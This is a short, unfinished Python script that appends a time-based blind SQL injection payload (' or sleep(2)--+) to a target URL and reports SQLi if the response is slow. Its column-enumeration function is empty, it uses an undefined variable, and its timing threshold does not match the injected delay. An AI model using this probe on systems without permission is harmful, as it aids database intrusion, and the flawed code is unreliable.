#!/usr/bin/python3

import sys,requests
import time



def help_menu():
    print("-u,--url  Url")
    print("-t,--type It shows which type of sqli the vulnerability is based, one of type Error based or of type Blind")

def find_sqli_blind(url,s):
    payload=""
    payload+=url
    payload+="' or sleep(2)--+"
    print(payload)
    start_time = time.time()
    r=s.get(payload)
    tiempo=round(time.time() - start_time,2)
    return True if(tiempo > 5 and int(r.status_code)==200) else False

def enum_columns(url,s):
    columna=""

    return columna

url=""
opcion1=""
try:
    opcion1=str(sys.argv[1])
    if(opcion1=="-u" or opcion=="--url"):
        url=str(sys.argv[2])
except:
    help_menu()


s=requests.session()
s.get(url)
r=s.get(url)

if(find_sqli_blind(url,s)):
    print("Exist SQLi in the target ")
